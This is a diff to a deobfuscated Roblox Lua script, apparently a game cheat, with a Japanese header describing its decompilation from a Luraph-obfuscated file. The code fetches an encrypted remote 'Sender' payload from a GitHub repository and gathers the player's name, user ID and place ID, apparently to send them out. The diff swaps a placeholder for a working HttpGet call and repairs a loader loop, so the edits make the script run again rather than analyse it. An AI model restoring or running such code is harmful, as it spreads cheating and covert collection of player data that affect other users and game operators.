@@ -1,3 +1,18 @@
+--[[
+  Test.obf  ->  逆コンパイル結果 (自動生成)
+  ------------------------------------------------------------------
+  元ファイル : https://raw.githubusercontent.com/tksuki/Script/refs/heads/main/Test.obf
+  形式       : Luraph系の仮想マシン難読化 (自己書き換えコード + 制御フロー平坦化 + 不透明述語)
+  手法       : VMのバイトコード(574関数・約7.3万命令)を取り出し、デコイ/パッチを解いて
+               逆アセンブル -> 変数復元 -> 式の畳み込み -> if/while/for を再構築
+  検証       : 本ファイルと元のVMを同じ模擬Roblox環境で実行し、副作用ログ(関数呼び出し・
+               プロパティ代入・HTTP要求など)382件が完全に一致することを確認済み
+  注意       : * 変数名は自動生成(元の名前は失われています。サービス名や文字列から推測した名前を一部使用)
+               * 元のコメント・ローカル関数名・空行などは復元できません
+               * goto は0件、Luauの構文チェックもエラー0件です
+               * 元コードと完全に同一ではなく、動作が同等になるよう再構成したものです
+  ------------------------------------------------------------------
+]]
 local TokraSecret, v122, v133, v2462, v2476, v550, v928
 local ContextActionService2, CurrentReach, HttpService, InPlot, IsHeld, Lighting2, LocalPlayer, Name, Players2, ReplicatedStorage2, RunService2, StarterGui2, TextChatService2, UserInputService2, v221, v231, v241, v242, v243, v244, v245, v246, v247, v249, v296
 do
@@ -149,7 +164,7 @@ do
     return
   end
   HttpService = game:GetService("HttpService")
-  local v69 = tbl280.tokra_decrypt(_HttpGet({}, "https://raw.githubusercontent.com/sladostrastnik/TokraScript/refs/heads/main/Sender.txt"))
+  local v69 = tbl280.tokra_decrypt(game:HttpGet("https://raw.githubusercontent.com/sladostrastnik/TokraScript/refs/heads/main/Sender.txt"))
   local v72 = v538(game.PlaceId)
   Name = LocalPlayer.Name
   local v74 = v538(LocalPlayer.UserId)
@@ -177,8 +192,9 @@ end
 local Default, Drag, Elements, LoadingFrame, Main, Notifications, Prompt, TabList, Topbar, fn232, fn233, fn234, fn235, fn238, fn239, fn241, fn242, tbl266, v1037, v1043, v2441, v2444, v2447, v2456, v2457, v2458, v2808, v2809, v2810, v2811, v2812, v2813, v2814
 do
   if not v296 or typeof(v296) ~= "Instance" or not v296:IsA("TextChannel") then
-    return
-  end
+  warn("RBXGeneral が見つかりませんでした")
+  return
+end
   local fn135 = function(a1_1)
     local v2873
     v2873 = game:GetService(a1_1)
@@ -225,9 +241,14 @@ do
       end
       return
     end)
-    while true do
+        while not v2884 do
       task.wait()
     end
+    if v2885 then
+      return v2886
+    end
+    warn("Failed to load: " .. tostring(v2886))
+    return nil
   end
   v1037 = "Rayfield/Configurations"
   local v1040 = fn135("HttpService")
